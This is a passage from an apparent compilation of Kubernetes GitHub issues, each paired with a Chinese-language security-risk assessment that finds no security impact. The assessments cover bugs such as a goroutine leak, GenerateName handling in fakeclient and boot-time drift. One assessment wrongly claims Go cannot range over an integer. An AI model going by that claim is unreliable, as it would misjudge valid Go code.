Create an authorization file and use it in the command line arguments for the kube-api server kubeadm init setup.

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
It's 1.31, the cluster doesnt initialize with the example
```

</details>


#### Cloud provider

<details>
None, Kubeadm cluster
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
PRETTY_NAME="Ubuntu 24.04.1 LTS"
NAME="Ubuntu"
VERSION_ID="24.04"
VERSION="24.04.1 LTS (Noble Numbat)"
VERSION_CODENAME=noble
ID=ubuntu
ID_LIKE=debian
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
UBUNTU_CODENAME=noble
LOGO=ubuntu-logo
$ uname -a
Linux kube-test-cp-01 6.8.0-45-generic #45-Ubuntu SMP PREEMPT_DYNAMIC Fri Aug 30 12:02:04 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>
kubeadm
</details>


#### Container runtime (CRI) and version (if applicable)

<details>
containerd containerd.io 1.7.22 7f7fdf5fed64eb6a7caf99b3e12efcf9d60e311c
</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>
None
</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
该Issue报告了Kubernetes文档中关于结构化授权的示例无效，导致用户在按照文档配置时出现错误。具体问题包括：

- 文档中使用了错误的参数名，应该是`KubeConfigFile`而不是`KubeConfig`。
- CEL选择器的表达式无效，导致语法错误。

这些问题会导致用户在配置kube-apiserver时无法正常启动，出现错误信息。根据提供的错误日志，主要是配置项和表达式的语法错误。这属于文档错误或配置错误，不涉及可被攻击者利用的安全风险。

根据风险判断标准，此问题不涉及安全问题。

---

## Issue #127900 bug(fakeclient): use fakeclient to create resource objects with GenerateName multiple times

- Issue 链接：[#127900](https://github.com/kubernetes/kubernetes/issues/127900)

### Issue 内容

#### What happened?

When we are doing unit testing, we often use fakeclient to simulate the behavior of the client creating resources. However, when creating resources with the GenerateName name multiple times, an error occurs.



#### What did you expect to happen?

creating resources with the GenerateName name multiple times,  and success

#### How can we reproduce it (as minimally and precisely as possible)?

code like this: 
```go
func TestExample(t *testing.T) {

	// use real client set, it works to create two pod with GenerateName
	// kubeClient := client.ClientSet.Client
	kubeClient := fake.NewSimpleClientset()

	pod := &v1.Pod{
		ObjectMeta: metav1.ObjectMeta{
			GenerateName: "my-pod-", //  generateName
			Namespace:    "default",
		},
		Spec: v1.PodSpec{
			Containers: []v1.Container{
				{
					Name:  "container1",
					Image: "nginx:latest",
				},
			},
		},
	}

	ctx := context.Background()
	createdPod, err := kubeClient.CoreV1().Pods("default").Create(ctx, pod, metav1.CreateOptions{})
	if err != nil {
		t.Fatalf("Failed to create pod: %v", err)
	}

	fmt.Printf("Created Pod: %s\n", createdPod.GenerateName)

	pod2 := &v1.Pod{
		ObjectMeta: metav1.ObjectMeta{
			GenerateName: "my-pod-",
			Namespace:    "default",
		},
		Spec: v1.PodSpec{
			Containers: []v1.Container{
				{
					Name:  "container1",
					Image: "nginx:latest",
				},
			},
		},
	}

	createdPod2, err := kubeClient.CoreV1().Pods("default").Create(ctx, pod2, metav1.CreateOptions{})
	if err != nil {
		t.Fatalf("Failed to create pod: %v", err)
	}

	fmt.Printf("Created Pod: %s\n", createdPod2.GenerateName)

	//expectedPrefix := "my-pod-"
	//if !strings.HasPrefix(createdPod.Name, expectedPrefix) {
	//	t.Errorf("Expected pod name to start with %q, got %q", expectedPrefix, createdPod.Name)
	//}
}

```

we got: 

```
=== RUN   TestExample
Created Pod: my-pod-
    plugin_test.go:316: Failed to create pod: pods "" already exists
--- FAIL: TestExample (0.00s)
```

#### Anything else we need to know?

I'm not sure if this is a bug or a feature.

#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here
```

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
该Issue描述了在使用fakeclient进行单元测试时，创建具有相同GenerateName的资源多次会出现错误。fakeclient是Kubernetes提供的用于单元测试的模拟客户端，用于模拟客户端行为，不影响生产环境。该问题仅限于测试环境下的行为差异，不涉及任何可被攻击者利用的安全漏洞或风险。根据风险判断标准第6条：“如果Issue不涉及安全问题，则风险评级判断为不涉及”，因此，该Issue不涉及安全风险。

---

## Issue #127890 A potential goroutine leak in kubernetes/test/utils/ktesting/signals.go

- Issue 链接：[#127890](https://github.com/kubernetes/kubernetes/issues/127890)

### Issue 内容

#### What happened?

The signalCtx is a context created by context.WithCancel() in func NotifyContext. But I found there is no cancelFunc to awaken the <-signalCtx.Done(), which leads the goroutine block forever and leak.
https://github.com/kubernetes/kubernetes/blob/7b28a115ba04651bc31aa1d7089abbd67ec5c067/test/utils/ktesting/signals.go#L46-L51

#### What did you expect to happen?

There is a cancelFunc to awaken the <-signalCtx.Done() to avoid blocking.

#### How can we reproduce it (as minimally and precisely as possible)?

You can reproduce the bug easily by goleak in some test functions such as
https://github.com/kubernetes/kubernetes/blob/7b28a115ba04651bc31aa1d7089abbd67ec5c067/pkg/kubelet/pod_workers_test.go#L1931
just add the code `defer goleak.VerifyNone(t)` in the beginning of the funcion like this,
```
func TestFakePodWorkers(t *testing.T) {
	defer goleak.VerifyNone(t)
```
Then run the test functioin to see the result below:

```
 pod_workers_test.go:1999: found unexpected goroutines:
        [Goroutine 98 in state select, with os/signal.NotifyContext.func1 on top of the stack:
        os/signal.NotifyContext.func1()
        	/home/song2048/桌面/goProject/pkg/mod/golang.org/toolchain@v0.0.1-go1.23.2.linux-amd64/src/os/signal/signal.go:288 +0x66
        created by os/signal.NotifyContext in goroutine 1
        	/home/song2048/桌面/goProject/pkg/mod/golang.org/toolchain@v0.0.1-go1.23.2.linux-amd64/src/os/signal/signal.go:287 +0x156
         Goroutine 99 in state chan receive, with k8s.io/kubernetes/test/utils/ktesting.init.1.func1 on top of the stack:
        k8s.io/kubernetes/test/utils/ktesting.init.1.func1()
        	/home/song2048/桌面/goProject/src/github.com/system-pclub/GCatch/GCatch/testdata/kubernetes/test/utils/ktesting/signals.go:51 +0x7c
        created by k8s.io/kubernetes/test/utils/ktesting.init.1 in goroutine 1
        	/home/song2048/桌面/goProject/src/github.com/system-pclub/GCatch/GCatch/testdata/kubernetes/test/utils/ktesting/signals.go:49 +0xf1
         Goroutine 94 in state select, with k8s.io/kubernetes/test/utils/ktesting.(*progressReporter).run on top of the stack:
        k8s.io/kubernetes/test/utils/ktesting.(*progressReporter).run(0xc0006fc060, {0x350e250, 0xc0005ffce0}, 0xc00066a540)
        	/home/song2048/桌面/goProject/src/github.com/system-pclub/GCatch/GCatch/testdata/kubernetes/test/utils/ktesting/signals.go:119 +0x85
        created by k8s.io/kubernetes/test/utils/ktesting.init.1 in goroutine 1
        	/home/song2048/桌面/goProject/src/github.com/system-pclub/GCatch/GCatch/testdata/kubernetes/test/utils/ktesting/signals.go:73 +0x24e
         Goroutine 110 in state chan receive, with k8s.io/kubernetes/pkg/kubelet.(*podWorkers).podWorkerLoop on top of the stack:
        k8s.io/kubernetes/pkg/kubelet.(*podWorkers).podWorkerLoop(0xc000440fa0, {0x0, 0x0}, 0xc000182ee0)
        	/home/song2048/桌面/goProject/src/github.com/system-pclub/GCatch/GCatch/testdata/kubernetes/pkg/kubelet/pod_workers.go:1216 +0x6c
        k8s.io/kubernetes/pkg/kubelet.(*podWorkers).UpdatePod.func1()
        	/home/song2048/桌面/goProject/src/github.com/system-pclub/GCatch/GCatch/testdata/kubernetes/pkg/kubelet/pod_workers.go:950 +0x118
        created by k8s.io/kubernetes/pkg/kubelet.(*podWorkers).UpdatePod in goroutine 109
        	/home/song2048/桌面/goProject/src/github.com/system-pclub/GCatch/GCatch/testdata/kubernetes/pkg/kubelet/pod_workers.go:945 +0x20db
         Goroutine 111 in state chan receive, with k8s.io/kubernetes/pkg/kubelet.(*podWorkers).podWorkerLoop on top of the stack:
        k8s.io/kubernetes/pkg/kubelet.(*podWorkers).podWorkerLoop(0xc000440fa0, {0x3041480, 0x8}, 0xc000182f50)
        	/home/song2048/桌面/goProject/src/github.com/system-pclub/GCatch/GCatch/testdata/kubernetes/pkg/kubelet/pod_workers.go:1216 +0x6c
        k8s.io/kubernetes/pkg/kubelet.(*podWorkers).UpdatePod.func1()
        	/home/song2048/桌面/goProject/src/github.com/system-pclub/GCatch/GCatch/testdata/kubernetes/pkg/kubelet/pod_workers.go:950 +0x118
        created by k8s.io/kubernetes/pkg/kubelet.(*podWorkers).UpdatePod in goroutine 109
        	/home/song2048/桌面/goProject/src/github.com/system-pclub/GCatch/GCatch/testdata/kubernetes/pkg/kubelet/pod_workers.go:945 +0x20db
         Goroutine 112 in state chan receive, with k8s.io/kubernetes/pkg/kubelet.(*podWorkers).podWorkerLoop on top of the stack:
        k8s.io/kubernetes/pkg/kubelet.(*podWorkers).podWorkerLoop(0xc000440fa0, {0x303c04d, 0x5}, 0xc000182fc0)
        	/home/song2048/桌面/goProject/src/github.com/system-pclub/GCatch/GCatch/testdata/kubernetes/pkg/kubelet/pod_workers.go:1216 +0x6c
        k8s.io/kubernetes/pkg/kubelet.(*podWorkers).UpdatePod.func1()
        	/home/song2048/桌面/goProject/src/github.com/system-pclub/GCatch/GCatch/testdata/kubernetes/pkg/kubelet/pod_workers.go:950 +0x118
        created by k8s.io/kubernetes/pkg/kubelet.(*podWorkers).UpdatePod in goroutine 109
        	/home/song2048/桌面/goProject/src/github.com/system-pclub/GCatch/GCatch/testdata/kubernetes/pkg/kubelet/pod_workers.go:945 +0x20db
        ]
--- FAIL: TestFakePodWorkers (0.45s)
```

#### Anything else we need to know?

_No response_

#### Kubernetes version

latest


#### Cloud provider

no


#### OS version

ubuntu20.04


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
该Issue报告了`kubernetes/test/utils/ktesting/signals.go`中的一个可能的goroutine泄漏问题。问题发生在测试代码中，`signalCtx`通过`context.WithCancel()`创建，但是没有调用对应的`cancelFunc`，导致goroutine阻塞，无法释放。此问题可以在测试函数中通过`goleak`检测到。

根据风险判断标准，该问题发生在测试代码中，不涉及生产环境，不会对系统的安全性产生影响。因此，不属于安全风险。

---

## Issue #127886 The Untyped Integer Error in ImageVolume  

- Issue 链接：[#127886](https://github.com/kubernetes/kubernetes/issues/127886)

### Issue 内容

In **/test/e2e_node/image_volume.go**

The loop is having integer which is using range  to iterate. Whereas range is used to iterate Array and slices. 

Please take a look in the code snippet here.

```
for i := range 2 {
			volumePath := fmt.Sprintf("%s-%d", volumePathPrefix, i)
			ginkgo.By(fmt.Sprintf("Verifying the volume mount contents for path: %s", volumePath))

			firstFileContents := e2epod.ExecCommandInContainer(f, podName, containerName, "/bin/cat", filepath.Join(volumePath, "dir", "file"))
			gomega.Expect(firstFileContents).To(gomega.Equal("1"))

			secondFileContents := e2epod.ExecCommandInContainer(f, podName, containerName, "/bin/cat", filepath.Join(volumePath, "file"))
			gomega.Expect(secondFileContents).To(gomega.Equal("2"))
		}
```

Possible Solution:
Either we can use traditional way of `for loop`  **for <initialization;condition;increment/decrement>**.
Or we can use slice to iterate.

### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
该Issue指出，在`/test/e2e_node/image_volume.go`文件中的一段代码使用了错误的`for`循环语法，即`for i := range 2`。在Go语言中，`range`关键字用于遍历数组、切片、字符串、映射和通道，不能直接用于整数类型。因此，这段代码会导致编译错误或运行时错误。

Issue提供了可能的解决方案，建议使用传统的`for`循环，或者将循环控制变量替换为可迭代的切片。

从安全角度来看，这属于代码实现错误或Bug，不涉及安全风险。没有涉及到攻击者可利用的漏洞，也不会导致安全漏洞。因此，该Issue不涉及安全问题。

---

## Issue #127883 unknown field \"anonymous\""

- Issue 链接：[#127883](https://github.com/kubernetes/kubernetes/issues/127883)

### Issue 内容

#### What happened?

```
apiVersion: apiserver.config.k8s.io/v1beta1
kind: AuthenticationConfiguration
anonymous:
  enabled: true
  conditions:
  - path: /api/v1/namespaces/kube-system/pods
```

--authentication-config=/etc/kubernetes/authentication-anonymous-config.yaml


```
// AuthenticationConfiguration provides versioned configuration for authentication.
type AuthenticationConfiguration struct {
	metav1.TypeMeta

	// jwt is a list of authenticator to authenticate Kubernetes users using
	// JWT compliant tokens. The authenticator will attempt to parse a raw ID token,
	// verify it's been signed by the configured issuer. The public key to verify the
	// signature is discovered from the issuer's public endpoint using OIDC discovery.
	// For an incoming token, each JWT authenticator will be attempted in
	// the order in which it is specified in this list.  Note however that
	// other authenticators may run before or after the JWT authenticators.
	// The specific position of JWT authenticators in relation to other
	// authenticators is neither defined nor stable across releases.  Since
	// each JWT authenticator must have a unique issuer URL, at most one
	// JWT authenticator will attempt to cryptographically validate the token.
	//
	// The minimum valid JWT payload must contain the following claims:
	// {
	//		"iss": "https://issuer.example.com",
	//		"aud": ["audience"],
	//		"exp": 1234567890,
	//		"<username claim>": "username"
	// }
	JWT []JWTAuthenticator `json:"jwt"`

	// If present --anonymous-auth must not be set
	Anonymous *AnonymousAuthConfig `json:"anonymous,omitempty"`
}
```

is anonymous new field

#### What did you expect to happen?

start up success

#### How can we reproduce it (as minimally and precisely as possible)?

apply the apiserver args

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>
1.30.1

</details>


#### Cloud provider

<details>
vmware workstations
</details>


#### OS version

<details>

ubuntu2404
```


```
</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
经过分析，该Issue不涉及安全风险。问题描述中，用户在配置Kubernetes的AuthenticationConfiguration时遇到了“unknown field 'anonymous'”的错误，说明配置文件中的'anonymous'字段未被识别。这可能是因为所使用的Kubernetes版本（1.30.1）不支持该字段或配置格式有误。此问题属于用户配置错误或版本兼容性问题，不存在被攻击者利用的安全风险，也不会导致高危漏洞。

---

## Issue #127859 PVC with a non-empty selector can’t have a PV dynamically provisioned

- Issue 链接：[#127859](https://github.com/kubernetes/kubernetes/issues/127859)

### Issue 内容

#### What happened?

This issue is spun off from #57878 - I can't specify a label selector on a PVC without first provisioning the PV with labels; I want to use dynamic provisioning and apply labels to the PV from the PVC. As I read in the above issue, there might be problems with doing this via `selector` so I thought to open this to request a new field for setting PV metadata labels and annotations from the PVC.

#### What did you expect to happen?

I expected that in the 6 years since the previous issue was opened, this would be improved.

#### How can we reproduce it (as minimally and precisely as possible)?

Try to provision a volume with dynamic provisioning by applying a PVC with selector labels specified. It fails.

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
Client Version: v1.30.4
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
Server Version: v1.30.4
```

</details>

#### Cloud provider

<details>
Azure
</details>


#### OS version

<details>
MacOS Sonoma 14.6.1

```console
Darwin WCG-MN64J410FL 23.6.0 Darwin Kernel Version 23.6.0: Mon Jul 29 21:13:04 PDT 2024; root:xnu-10063.141.2~1/RELEASE_ARM64_T6020 arm64
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
该Issue描述了在使用Kubernetes动态存储卷（PV）创建过程中，无法通过在持久化存储声明（PVC）中指定选择器（selector）来给PV设置标签（labels）的问题。Issue提交者希望能够在PVC中指定标签和注解，以便在动态创建PV时应用这些元数据。这是一个功能性需求，涉及到Kubernetes的存储卷管理机制。

从安全角度来看，该Issue并未涉及潜在的安全风险。它没有描述任何可能导致攻击者利用的漏洞，也没有涉及命令执行、容器逃逸、提权等高安全风险的问题。因此，根据风险判断标准，此Issue不涉及安全风险。

---

## Issue #127845 Is it normal to be unable to curl a Kubernetes service's ClusterIP from inside a pod?

- Issue 链接：[#127845](https://github.com/kubernetes/kubernetes/issues/127845)

### Issue 内容

#### What happened?

**Hi everyone!** 👋

I'm running into an issue in my Kubernetes cluster where **I can't curl a service's ClusterIP from inside a pod**. The service itself is up and running — I can see it when I run kubectl get svc — but whenever I try to access it using curl, the request just times out.

I'm not sure if this is expected behavior or if there might be a misconfiguration somewhere in my cluster setup. 🤔

Here's some context:
The service is of type **ClusterIP**.

I can access the service by curling the pod's IP directly, but not through the service's ClusterIP. ❌

DNS resolution works fine — nslookup returns the correct IP for the service. ✅

There are no NetworkPolicies in place that would restrict traffic in the namespace. 🚫

Has anyone encountered something like this before? Any insights or advice would be greatly appreciated! 🙏

#### What did you expect to happen?

I expected that the curl requests to either the service name (hello-web.apps.svc.cluster.local) or the ClusterIP (10.103.60.54) would successfully reach the Nginx container running in the pod. 🛠️ Since DNS resolves correctly and the service looks properly configured, I thought this would work smoothly.

However, the requests are timing out. 😕
I'm not sure if it's a configuration issue on my side or if there's something missing in the Kubernetes network setup. 
Or... **could this even be the default behavior** and maybe it wasn't supposed to work this way in the first place? 🤷‍♂️

---

#### How can we reproduce it (as minimally and precisely as possible)?

I ran the following **simple test** to try and understand the issue:

kubectl run curl-test --rm -i --tty --image=curlimages/curl -- /bin/sh                

If you don't see a command prompt, try pressing enter.
~ $ nslookup 10.103.60.54
Server:         10.96.0.10
Address:        10.96.0.10:53

54.60.103.10.in-addr.arpa       name = hello-web.apps.svc.cluster.local

~ $ **curl http://hello-web.apps.svc.cluster.local:80**
curl: (28) Failed to connect to hello-web.apps.svc.cluster.local port 80 after 135674 ms: Could not connect to server
~ $ curl http://10.103.60.54:80
curl: (28) Failed to connect to 10.103.60.54 port 80 after 132964 ms: Could not connect to server

---

#### Anything else we need to know?

**According to the official Kubernetes documentation**:
> Services
> A/AAAA records
> "Normal" (not headless) Services are assigned DNS A and/or AAAA records, depending on the IP family or families of the Service, with a name of the form my-svc.my-namespace.svc.cluster-domain.example. This resolves to the cluster IP of the Service.

Based on this, I understand that I should be able to use curl http://hello-web.apps.svc.cluster.local:80 to reach the service, as it resolves correctly in the DNS lookup.

However, both the DNS name and the ClusterIP return the same error when attempting to curl the service.

--- 
Here is the **service and deployment manifest** I'm using:

```yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: hello-web
  namespace: apps
  labels:
    app: hello-web
spec:
  selector:
    matchLabels:
      app: hello-web
  replicas: 1
  template:
    metadata:
      labels:
        app: hello-web
    spec:
      containers:
      - name: nginx
        image: nginx:latest
        ports:
        - containerPort: 80
---
apiVersion: v1
kind: Service
metadata:
  name: hello-web
  labels:
    run: hello-web
  namespace: apps
spec:
  ports:
  - port: 80
    protocol: TCP
  selector:
    app: hello-web

```
--- 

#### Kubernetes version

<details>

```console
kubectl version
Client Version: v1.31.1
Kustomize Version: v5.4.2
Server Version: v1.31.0
```

</details>


#### Cloud provider

<details>
Hetzner vps
</details>


#### OS version

<details>

```console
PRETTY_NAME="Ubuntu 24.04.1 LTS"
```

</details>


#### Install tools

<details>
kubeadm
</details>


#### Container runtime (CRI) and version (if applicable)

<details>
containerd - crictl version v1.31.1
</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>
CNI : flannel - v1.5.1-flannel2
</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
经过分析，Issue主要描述了在Kubernetes集群中，从一个Pod内部无法通过curl访问另一个Service的ClusterIP地址的问题。用户提供了详细的排查信息，包括DNS解析、Service和Deployment的配置等。这是一个关于Kubernetes网络配置和Service访问的问题，并未涉及任何安全风险。

根据风险判断标准，Issue没有提到任何可被攻击者利用的漏洞，也没有涉及高风险的安全问题。因此，风险评级判断为不涉及。

---

## Issue #127844 Something changed in 1.30 so Java application memory usage drastically changed behaviour?

- Issue 链接：[#127844](https://github.com/kubernetes/kubernetes/issues/127844)

### Issue 内容

#### What happened?

The memory usage is observed with `container_memory_working_set_bytes`.

Before 1.30:

<img width="160" alt="image" src="https://github.com/user-attachments/assets/545fa558-f0a5-485c-af85-d54d3376a131">

After upgrading to 1.30:

<img width="223" alt="image" src="https://github.com/user-attachments/assets/280980cd-ec8a-45d6-83c5-0a5ba233e25b">

We haven't changed anything related to Kafka configuration in the meantime. Version used: `quay.io/strimzi/kafka:0.33.0-kafka-3.2.0`.

The problem with new behaviour is that sometimes we can get `NodeHasInsufficientMemory` which means more time for Kafka to recover.

The change in behaviour is present in other Java applications like Cassandra as well.

#### What did you expect to happen?

I'd expect memory to fill the cache and stay near the limit like before 1.30.

#### How can we reproduce it (as minimally and precisely as possible)?

One can run Kafka cluster in 1.29 and 1.30. Kafka will always fill all the memory it can (either up to memory limit or node memory limit).

You will see pattern of clearing cache memory in 1.30.

#### Anything else we need to know?

This is happening with multiple Kafka clusters. Some of those are running in cgroup v1 nodes, but some in cgroup v2. 

#### Kubernetes version

```
v1.30.5-gke.1014000
```

#### Cloud provider

```
1.30.5-gke.1014000
```

#### OS version

```console
NAME="Container-Optimized OS"
ID=cos
PRETTY_NAME="Container-Optimized OS from Google"
HOME_URL="https://cloud.google.com/container-optimized-os/docs"
BUG_REPORT_URL="https://cloud.google.com/container-optimized-os/docs/resources/support-policy#contact_us"
GOOGLE_METRICS_PRODUCT_ID=26
KERNEL_COMMIT_ID=395e8b40dd8bc3fe97fa563ffa370c25bd1da560
GOOGLE_CRASH_ID=Lakitu
VERSION=113
VERSION_ID=113
BUILD_ID=18244.151.27
```

$ uname -a
```
Linux 6.1.100+ #1 SMP PREEMPT_DYNAMIC Sat Aug 24 16:19:44 UTC 2024 x86_64 AMD EPYC 7B13 AuthenticAMD GNU/Linux
```

### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
通过对该Issue的分析，可以看出问题集中在升级Kubernetes到1.30版本后，Java应用程序（如Kafka、Cassandra）的内存使用行为发生了变化，导致有时会出现`NodeHasInsufficientMemory`的情况。这可能会导致Kafka恢复时间增加。

从安全风险的角度来看，该问题并未涉及攻击者可利用的漏洞或风险。问题更多地属于性能或资源管理方面的变化，而非安全漏洞。

根据风险判断标准：

1. **该风险能被攻击者利用**：未提及攻击者可利用的方式。
2. **该风险有可能成为一个漏洞，并被分配CVE编号，使用CVSS 3.1评分标准打分，结果要在high以上**：没有迹象表明这是一个安全漏洞。
6. **如果Issue不涉及安全问题，则风险评级判断为不涉及**。

因此，该Issue不涉及安全风险。

---

## Issue #127841 kubelet GetBootTime() could drift backward for 1s

- Issue 链接：[#127841](https://github.com/kubernetes/kubernetes/issues/127841)

### Issue 内容

#### What happened?

There are a few places in kubelet that calls `pkg/kubelet/util`.`GetBootTime()`. One such place is the kubelet `/stats/summary` endpoint where it's getting the node startTime: [ref](https://github.com/kubernetes/kubernetes/blob/v1.30.0/pkg/kubelet/server/stats/summary.go#L56)

And there's an issue in the [Linux implementation of `GetBootTime`](https://github.com/kubernetes/kubernetes/blob/v1.31.0/pkg/kubelet/util/boottime_util_linux.go#L30) that the result is not consistent: sometimes it could drift backwards for 1s. This caused problem in certain monitoring systems where the time series database expect timestamps to be monotonically increasing.****

#### What did you expect to happen?

`GetBootTime()` to return consistent result everytime it runs, more specifically the kubelet `/stats/summary` endpoint returns a consistent node startTime when kubelet restarts.

#### How can we reproduce it (as minimally and precisely as possible)?

do the following steps multiple times:

- restart kubelet
- do a http get on kubelet /stats/summary endpoint
- observe the `node`.`startTime` field in the response

you will see the node startTime could shift backwards for 1s in some cases.

You can also reproduce the issue by simply running the same `GetBootTime` logic multiple times:

```
cat get-boot-time.go 
package main

import (
	"fmt"
	"time"
	"golang.org/x/sys/unix"
)

func main() {
	// This is the same logic as `pkg/kubelet/util/boottime_util_linux.go`
	currentTime := time.Now()
	var info unix.Sysinfo_t
	if err := unix.Sysinfo(&info); err != nil {
		fmt.Errorf("error getting system uptime: %s", err)
		return
	}
	bootTime := currentTime.Add(-time.Duration(info.Uptime) * time.Second).Truncate(time.Second)
	fmt.Printf("bootTime: %s\n", bootTime)
	return
}

$ for i in {1..100} ; do go run get-boot-time.go ; done
bootTime: 2024-09-09 01:04:18 +0000 UTC
bootTime: 2024-09-09 01:04:18 +0000 UTC
bootTime: 2024-09-09 01:04:17 +0000 UTC    <--------- 1s backward drift
bootTime: 2024-09-09 01:04:18 +0000 UTC
 bootTime: 2024-09-09 01:04:18 +0000 UTC
bootTime: 2024-09-09 01:04:18 +0000 UTC
bootTime: 2024-09-09 01:04:18 +0000 UTC
```

#### Anything else we need to know?

I think the cause is a combination of multiple factors:

(a) `currentTime := time.Now()` is represented in a sub-second unit
(b) `unix.Sysinfo.Uptime` has a unit in second
(c) GetBootTime() subtracts uptime from current time and then round to the earlier second with the `time`.`Truncate()` method

so the following situation could happen:

1. system actually starts at 0,
2. when kubelet calls GetBootTime(), currentTIme returns 10s 999ms 999us 999ns
3. then 1us later, sysInfo reports Uptime 11s
4. at the end GetBootTime would round (10.999999 - 11) and return -1s instead of the actual 0s

#### One possible solution:

The drift always happen when Sysinfo.upTime increased by one second, so we could avoid it by: call the same GetBootTime() logic 3 times in a row, assuming each call finishes < 1s, then there will be for sure at least 2 times where Sysinfo.upTime agrees with each other. Then out of the 2 times, we use the GetBootTime() result from first one.

#### Kubernetes version

all existing kubernetes versions

#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
经过分析，该Issue描述了kubelet的GetBootTime()函数在某些情况下会返回比实际时间早1秒的启动时间，可能导致监控系统中的时间序列数据出现问题。然而，这属于功能性错误，不涉及潜在的安全风险。根据风险判断标准，该问题不会被攻击者利用，也不会产生高危漏洞，不涉及安全风险。

---

## Issue #127837 1.30.5 binary : 404

- Issue 链接：[#127837](https://github.com/kubernetes/kubernetes/issues/127837)

### Issue 内容

#### What happened?

404 https://storage.googleapis.com/kubernetes-release/release/v1.30.5/bin/linux/amd64/kubectl

#### What did you expect to happen?

200 ok

#### How can we reproduce it (as minimally and precisely as possible)?

wget https://storage.googleapis.com/kubernetes-release/release/v1.30.5/bin/linux/amd64/kubectl

#### Anything else we need to know?

_No response_

#### Kubernetes version

1.30.5


#### Cloud provider

no

#### OS version

all

#### Install tools

kubectl

#### Container runtime (CRI) and version (if applicable)

all

#### Related plugins (CNI, CSI, ...) and versions (if applicable)

all

### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
该Issue描述了用户在尝试下载Kubernetes 1.30.5版本的kubectl二进制文件时，收到了404错误。用户期望获取200 OK的响应。这可能是因为该版本的kubectl二进制文件尚未发布，或者下载地址有误。这是一个版本发布或下载链接问题，不涉及任何安全风险。

---

## Issue #127826 device manager: potential Double-Locking of Mutex

- Issue 链接：[#127826](https://github.com/kubernetes/kubernetes/issues/127826)

### Issue 内容

#### What happened?

In the file [pod_devices.go](https://github.com/kubernetes/kubernetes/blob/master/pkg/kubelet/cm/devicemanager/pod_devices.go#L101), there is a potential issue of double-locking a mutex in the function `podDevices`.
- In line [102](https://github.com/kubernetes/kubernetes/blob/master/pkg/kubelet/cm/devicemanager/pod_devices.go#L102), the read lock (`pdev.RLock()`) is acquired in the `podDevices` function to ensure safe access to `pdev.devs`.
- Later, on line [107](https://github.com/kubernetes/kubernetes/blob/master/pkg/kubelet/cm/devicemanager/pod_devices.go#L107), `podDevices` calls [containerDevices](https://github.com/kubernetes/kubernetes/blob/master/pkg/kubelet/cm/devicemanager/pod_devices.go#L114), which also attempts to acquire the same read lock via another call to `pdev.RLock()` on line [115](https://github.com/kubernetes/kubernetes/blob/master/pkg/kubelet/cm/devicemanager/pod_devices.go#L115). This may result in double-locking the same mutex within the same thread.

Even though both `podDevices` and `containerDevices` only use read locks (`RLock()`), double-locking a mutex, even for reads, can lead to deadlocks, if there is another routine trying to acquire `Lock()` in between the `RLock()`s, according to the documentation of [RWMutex](https://pkg.go.dev/sync#RWMutex).

The standard `sync.Mutex()` in **Go** is not a recursive locking implementation while it is used recursively in the `podDevices` function. You can read more on why go does not implement recursive locking [here](https://groups.google.com/g/golang-nuts/c/XqW1qcuZgKg/m/Ui3nQkeLV80J).

#### What did you expect to happen?

The expectation is that a mutex should not be double-locked within the same thread. In this case, either the locking logic needs to be restructured to prevent multiple acquisitions of the same lock or `containerDevices` should not attempt to lock the mutex if it is already locked by `podDevices`.

#### How can we reproduce it (as minimally and precisely as possible)?

This issue is identified through static analysis, so it cannot be directly reproduced via runtime observation. However, if left unresolved, it could lead to unpredictable behavior in environments where recursive read locks are not supported.

#### Anything else we need to know?

Sponsorship and Support:

This work is done by the security researchers from OpenRefactory and is supported by the [Open Source Security Foundation (OpenSSF)](https://openssf.org/): [Project Alpha-Omega](https://alpha-omega.dev/). Alpha-Omega is a project partnering with open source software project maintainers to systematically find new, as-yet-undiscovered vulnerabilities in open source code - and get them fixed – to improve global software supply chain security.

